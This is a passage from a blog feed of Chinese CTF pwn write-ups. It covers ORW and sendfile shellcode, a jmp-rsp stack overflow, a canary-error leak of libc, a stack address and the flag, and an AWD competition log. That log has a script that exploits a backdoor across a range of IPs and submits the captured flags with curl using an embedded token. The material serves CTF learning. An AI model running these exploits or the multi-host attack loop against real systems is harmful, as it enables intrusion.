class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax, 0x67616c662f2e ; flag</span><br><span class="line">push rax; rax将&quot;flag&quot;入栈</span><br><span class="line">mov rsi, rsp; &quot;flag&quot;赋值给rsi,即文件路径</span><br><span class="line">xor rax, rax; 清零</span><br><span class="line">xor rdi, rdi; 清零</span><br><span class="line">sub rdi, 100; </span><br><span class="line">xor rdx, rdx; 清零</span><br><span class="line">mov r10, 7 ; rwx权限</span><br><span class="line">mov rax, 0x101; 系统调用号</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><ul><li>sendfile</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rdi,1; 目标文件指向stdout，标准输出</span><br><span class="line">mov rsi,3   ; 源文件，0-stdin 1-stdout 2-stderr 3-flag</span><br><span class="line">mov rdx,0; 偏移量0</span><br><span class="line">mov r10,0x100; 输出字节数设置大一点</span><br><span class="line">push 40; 系统调用号</span><br><span class="line">pop rax</span><br><span class="line">syscall </span><br></pre></td></tr></table></figure><h1 id="3-完整EXP"><a href="#3-完整EXP" class="headerlink" title="3.完整EXP"></a>3.完整EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;challenge.basectf.fun&quot;</span>,<span class="number">30343</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">shellcode = (<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f2e </span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov r10, 7</span></span><br><span class="line"><span class="string">    mov rax, 0x101</span></span><br><span class="line"><span class="string">    syscall </span></span><br><span class="line"><span class="string">               </span></span><br><span class="line"><span class="string">    mov rdi,1</span></span><br><span class="line"><span class="string">    mov rsi,3   </span></span><br><span class="line"><span class="string">    mov rdx,0</span></span><br><span class="line"><span class="string">    mov r10,0x100</span></span><br><span class="line"><span class="string">    push 40</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctfpwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>该文章暂当图床</title>
      <link href="/2024/09/17/%E8%AF%A5%E6%96%87%E7%AB%A0%E6%9A%82%E5%BD%93%E5%9B%BE%E5%BA%8A/"/>
      <url>/2024/09/17/%E8%AF%A5%E6%96%87%E7%AB%A0%E6%9A%82%E5%BD%93%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/09/17/%E8%AF%A5%E6%96%87%E7%AB%A0%E6%9A%82%E5%BD%93%E5%9B%BE%E5%BA%8A/capture_20240727171132952.png"></p><p><img src="/2024/09/17/%E8%AF%A5%E6%96%87%E7%AB%A0%E6%9A%82%E5%BD%93%E5%9B%BE%E5%BA%8A/capture_20240727205848343.bmp"></p>]]></content>
      
      
      
        <tags>
            
            <tag> trash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战_2019-Not_Bad</title>
      <link href="/2024/09/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad/"/>
      <url>/2024/09/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad/</url>
      
        <content type="html"><![CDATA[<h1 id="典型的ORW-mmap参数理解"><a href="#典型的ORW-mmap参数理解" class="headerlink" title="典型的ORW+mmap参数理解"></a>典型的ORW+mmap参数理解</h1><p><a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Not%20Bad">题目连接</a></p><p><font color="red">知识点</font></p><p>1.典型的沙箱，ORW</p><p>2.mmap参数的理解，参考<a href="https://zhuanlan.zhihu.com/p/527532465">这篇文章</a></p><h2 id="1-ida速览"><a href="#1-ida速览" class="headerlink" title="1.ida速览"></a>1.ida速览</h2><ul><li>已经修改了函数名，加入了沙箱</li></ul><p><img src="/2024/09/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad/capture_20240916154952629.bmp"></p><ul><li>发现是典型的ORW可用：</li></ul><p><img src="/2024/09/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad/capture_20240916155021894.bmp"></p><ul><li>查看一下主要部分：</li></ul><p><img src="/2024/09/16/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad/capture_20240916155002230.bmp"></p><p>存在明显的栈溢出，并且此题保护全关，可以直接写入shellcode。</p><h3 id="简单思路"><a href="#简单思路" class="headerlink" title="简单思路"></a>简单思路</h3><ul><li>关于mmap函数的参数可以参考开头的文章，此处的mmap会在指定的地址开辟一个0x1000的可写可执行区域(prot&#x3D;6，不可读)，因此我们可以在该地址写入shellcode，然后使之被调用就可以getflag。</li><li>具体的构造看下面吧：</li></ul><h2 id="2-完整分析"><a href="#2-完整分析" class="headerlink" title="2.完整分析"></a>2.完整分析</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可以先将已知的和需要的先构建出来</span></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line"><span class="comment"># 先构造好shellcode,典型的ORW</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure><ul><li>这里要解释一下read的第一个参数的含义，代表我要读的文件是第几个，即fd，所谓的3是因为</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> : <span class="built_in">stdin</span></span><br><span class="line"><span class="number">1</span> : <span class="built_in">stdout</span></span><br><span class="line"><span class="number">2</span> : <span class="built_in">stderr</span></span><br><span class="line"><span class="number">3</span> ：flag</span><br></pre></td></tr></table></figure><ul><li>shellcode是构造完了，但是这个shellcode的长度有0x52，能直接写吗？当然不行，栈空间不够啊，那要如何完成呢？</li><li>我们可以在栈开头调用一个read，再将这个shellcode输入到mmap的地址，最后改变rax为mmap地址，再call就好了，那么初始的构造就如下了：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>)) + asm(<span class="string">&quot;mov rax,0x123000;call rax&quot;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>这样我们就构造好了开始的结构，只要调用这个，再次输入shellcode，就可以getflag了，如何调用？可以参考我之前写的<a href="https://blog.csdn.net/zwb2603096342/article/details/139296136?spm=1001.2014.3001.5502">这篇博客</a></li><li>我们只需要将ret_address改为jmp_rsp的地址，此时ret相当于执行pop rip，将rsp的值弹给rip，那么此时的<strong>rip就是jmp_rsp</strong>，同时，也由于pop rip中的pop，导致rsp+8，此时rsp指向下一条语句，即”sub rsp;0x30;jmp rsp”,rip此时jmp_rsp,相当于执行这段语句，那么便会执行栈开头的系统调用了</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload += p64(jmp_rsp) + asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>) <span class="comment"># jmp_rsp为地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Easy shellcode, have fun!\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><h2 id="3-完整EXP："><a href="#3-完整EXP：" class="headerlink" title="3.完整EXP："></a>3.完整EXP：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,28443)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">jmp_rsp =<span class="number">0x0000000000400a01</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先构造好shellcode,典型的ORW</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将shellcode写在mmap开辟的固定地址，然后call该地址，执行shellcode</span></span><br><span class="line"><span class="comment">#bug() </span></span><br><span class="line">payload = asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>)) + asm(<span class="string">&quot;mov rax,0x123000;call rax&quot;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(jmp_rsp) + asm(<span class="string">&quot;sub rsp,0x30;jmp rsp&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Easy shellcode, have fun!\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wdb2018_guess--canary报错利用</title>
      <link href="/2024/09/16/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/"/>
      <url>/2024/09/16/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="修改argv-0-使canary报错时泄露信息"><a href="#修改argv-0-使canary报错时泄露信息" class="headerlink" title="修改argv[0],使canary报错时泄露信息"></a>修改argv[0],使canary报错时泄露信息</h1><p><a href="https://buuoj.cn/challenges#wdb2018_guess">题目链接</a></p><p><a href="https://blog.csdn.net/Invin_cible/article/details/123042863">参考文章</a></p><p><font color="red">知识点：</font></p><p>1.<strong>canary报错的利用，熟悉报错的参数是什么</strong></p><p>2.<strong>__environ环境变量</strong></p><h2 id="1-ida速览"><a href="#1-ida速览" class="headerlink" title="1.ida速览"></a>1.ida速览</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __WAIT_STATUS stat_loc; <span class="comment">// [rsp+14h] [rbp-8Ch] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+30h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">56</span>]; <span class="comment">// [rsp+60h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = <span class="number">3LL</span>;</span><br><span class="line">  LODWORD(stat_loc.__uptr) = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  sub_4009A6(a1, a2, a3);</span><br><span class="line">  HIDWORD(stat_loc.__iptr) = open(<span class="string">&quot;./flag.txt&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( HIDWORD(stat_loc.__iptr) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;./flag.txt&quot;</span>);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(SHIDWORD(stat_loc.__iptr), buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  close(SHIDWORD(stat_loc.__iptr));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This is GUESS FLAG CHALLENGE!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;you have no sense... bye :-) &quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_400A11() ) <span class="comment">// 此处创建子进程</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please type your guessing flag&quot;</span>);</span><br><span class="line">  gets(s2); <span class="comment">// 明显的栈溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(buf, s2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You must have great six sense!!!! :-o &quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You should take more effort to get six sence, and one more challenge!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>是可以发现有三次fork创建子进程的，说明我们可以利用三次canary报错</p></li><li><p>为什么想到这个，是因为我们没有其他的输出的可以利用，所以想到这个。</p></li><li><p>大致的思路就是通过泄露flag在栈上的地址，然后通过canary报错输出出来，具体看下面的实现.</p></li></ul><h2 id="2-gdb调试"><a href="#2-gdb调试" class="headerlink" title="2.gdb调试"></a>2.gdb调试</h2><p>首先要patchelf，将环境改为glibc2.24，不然无法实现。</p><p><img src="/2024/09/16/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916141131322.bmp"></p><p>发现报错部分出现了程序的名字，那么这个是什么呢？这个其实就是argv[0]，也就是说argv[0]会随着canary报错的时候输出出来，那如果我们将其改为某个函数的got表的内容，那是不是就可以输出其真实地址了，达到泄露libc的作用，下面来看看栈布局：</p><p><img src="/2024/09/16/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916141833635.bmp"></p><ul><li>这里可以很清楚的看到输入的地址和argv[0]相差0x128,我们通过栈溢出覆盖此处的地址为got表地址即可泄露libc</li></ul><h3 id="1-泄露Libc："><a href="#1-泄露Libc：" class="headerlink" title="(1) 泄露Libc："></a>(1) 泄露Libc：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># step1 -- 泄漏栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(puts_got)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_address : &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure><ul><li>看看实际效果</li></ul><p><img src="/2024/09/16/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916143126078.bmp"></p><h3 id="2-通过-environ泄露环境变量地址"><a href="#2-通过-environ泄露环境变量地址" class="headerlink" title="(2)通过__environ泄露环境变量地址"></a>(2)通过__environ泄露环境变量地址</h3><p>关于__environ可以参考开头的文章</p><p><img src="/2024/09/16/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916144643853.bmp"></p><ul><li>光标处就是__environ的地址，很明显该地址是在栈上的，因此我们泄露出该地址，就可以获得栈地址了.</li></ul><p><img src="/2024/09/16/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916144655337.bmp"></p><ul><li>发现flag的地址与__environ的地址差距0x168，因此将environ的地址泄露出来,再减去0x168就是flag的地址，然后通过同样的溢出，就可以泄露flag了.(该flag是我本地建立的，为了调试方便)</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># step2 -- 泄漏flag地址</span></span><br><span class="line">payload = cyclic(<span class="number">0x128</span>) + p64(environ)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">buf = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x168</span></span><br><span class="line">success(<span class="string">&#x27;buf(flag)_address : &#x27;</span>+<span class="built_in">hex</span>(buf))</span><br></pre></td></tr></table></figure><h3 id="3-泄露flag"><a href="#3-泄露flag" class="headerlink" title="(3),泄露flag"></a>(3),泄露flag</h3><p>直接看最后的EXP吧</p><p><img src="/2024/09/16/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916145230691.bmp"></p><h2 id="3-最终EXP"><a href="#3-最终EXP" class="headerlink" title="3.最终EXP"></a>3.最终EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,28532)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 三次创建fork，相当于可以利用三次程序</span></span><br><span class="line"><span class="comment"># 第一次泄漏libc，第二次泄漏栈地址，第三次泄漏flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step1 -- 泄漏栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_address : &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">environ = base + libc.dump(<span class="string">&#x27;__environ&#x27;</span>) <span class="comment"># 环境变量的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step2 -- 泄漏flag地址</span></span><br><span class="line">payload = cyclic(<span class="number">0x128</span>) + p64(environ)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">buf = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x168</span></span><br><span class="line">success(<span class="string">&#x27;buf(flag)_address : &#x27;</span>+<span class="built_in">hex</span>(buf))</span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 -- 打印出flag</span></span><br><span class="line">payload = cyclic(<span class="number">0x128</span>) + p64(buf)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记第一次awd测试</title>
      <link href="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/"/>
      <url>/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="只针对pwn方向"><a href="#只针对pwn方向" class="headerlink" title="只针对pwn方向"></a>只针对pwn方向</h1><p><font size="4" color="red">题目：<strong>Bugku S3 AWD排位赛-13(双倍积分)</strong></font></p><p><font size="4" color="red">参考视频：<a href="https://www.bilibili.com/video/BV1FD4y147vu/?spm_id_from=333.337.search-card.all.click&vd_source=3a102c224ddc9fd26cd9c49207334603">AWD_哔哩哔哩_bilibili</a></font></p><p><font size="4" color="red">工具：</font></p><p><strong>Xterminal</strong>：<a href="https://www.xterminal.cn/">Xterminal - 更好用的开发工具，但不止于(SSH&#x2F;控制台&#x2F;More)</a></p><h3 id="1-ssh连接"><a href="#1-ssh连接" class="headerlink" title="1.ssh连接"></a>1.ssh连接</h3><ul><li>此处是结束之后写的，所以缺少截图了，不过可以看上面的参考视频。</li><li>开始比赛之前务必让队长给你本机ip加入到白名单上面</li><li>比赛开始，会有自己的虚拟ip地址，也会给队伍名和密码，队伍名类似于team1，密码较长。</li></ul><p><img src="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904222732662.bmp"></p><ul><li>类似上面的，我拿的是Xterminal连接，分组和名称乱填就行。</li></ul><h3 id="2-对pwn文件进行修复和攻击"><a href="#2-对pwn文件进行修复和攻击" class="headerlink" title="2.对pwn文件进行修复和攻击"></a>2.对pwn文件进行修复和攻击</h3><h4 id="2-1-攻击本地"><a href="#2-1-攻击本地" class="headerlink" title="2.1 攻击本地"></a>2.1 攻击本地</h4><ul><li>连接服务器之后，在&#x2F;home&#x2F;ctf文件下面有pwn文件，下载下来即可，拖进自己的虚拟机，然后跟正常的ctf比赛一样。</li><li>checksec一下文件，发现没canary也没有PIE</li></ul><p><img src="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904223824348.bmp"></p><p><img src="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904223741981.bmp"></p><p><img src="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904223748645.bmp"></p><ul><li><strong>从ida可以看出，直接给的pwn文件可以说没有任何保护，把能给的信息都给了，还给了栈上地址任意修改的权限，并且还给了后门函数。那么很简单，直接修改ret_addr为后门函数地址就可以得到flag了</strong>。</li></ul><p><img src="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240904224136529.bmp"></p><h4 id="2-2-攻击远程"><a href="#2-2-攻击远程" class="headerlink" title="2.2 攻击远程"></a>2.2 攻击远程</h4><ul><li>远程其实跟做题目一样，得到ip地址，这一步靠web手将其他服务器的虚拟ip爆破出来(虚拟ip只有一位不同)，然后ping一下就有ip了</li><li><strong>端口问题</strong>：起初我以为是默认的2222，结果上网搜<a href="https://www.anquanke.com/post/id/256463">其他比赛的脚</a><a href="https://www.anquanke.com/post/id/256463">本</a>，发现端口其实是9999</li></ul><p><img src="/2024/09/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1awd%E6%B5%8B%E8%AF%95/capture_20240902204946705.bmp"></p><ul><li><p><strong>得到的flag就可以直接提交了</strong></p></li><li><p>至于循环提交flag，这里贴一个脚本，但是最后也没来得及测试。脚本中爆破就爆破了一位，但其实后为ip地址都是不相同的</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="comment"># 本机ip: 47.104.214.84</span></span><br><span class="line"><span class="comment"># 其他ip: 47.104.195.88</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip = <span class="string">&quot;47.104.195.&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>)</span><br><span class="line">        p = remote(ip,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&quot;saved rbp\n&quot;</span>)</span><br><span class="line">        ret_addr = <span class="built_in">int</span>(p.recv()[<span class="number">1</span>:<span class="number">19</span>],<span class="number">16</span>)</span><br><span class="line">        success(<span class="string">&quot;ret_addr&quot;</span>,<span class="built_in">hex</span>(ret_addr))</span><br><span class="line">        p.send(<span class="built_in">str</span>(ret_addr))</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&quot; = &quot;</span>)</span><br><span class="line">        p.send(<span class="built_in">str</span>(<span class="number">0x00000000004011fa</span>))</span><br><span class="line">        flag = <span class="built_in">str</span>(p.recvuntil(<span class="string">b&#x27;\n\n&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        payload = <span class="string">&quot;curl https://ctf.bugku.com/pvp/submit.html?token=72b8175c72f2abe98330367a34bfa64a&amp;flag=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(flag)</span><br><span class="line">        os.system(payload)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(ip)</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;本轮共拿到&quot;</span>+<span class="built_in">str</span>(index)+<span class="string">&quot;个队伍flag&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="2-3-修复文件"><a href="#2-3-修复文件" class="headerlink" title="2.3 修复文件"></a>2.3 修复文件</h4><ul><li>因为是新手不会在ida patch改，所以上的是通防：<a href="https://github.com/TTY-flag/evilPatcher">https://github.com/TTY-flag/evilPatcher</a></li><li><font size="4" color="red">具体使用：</font></li></ul><p>1.安装seccomp-tools</p><p>2.git clone + 上面仓库地址.git，然后给pwn文件丢到目录下面</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 evilPatcher.py pwn sandboxs/mini_sandbox.asm</span><br></pre></td></tr></table></figure><p><img 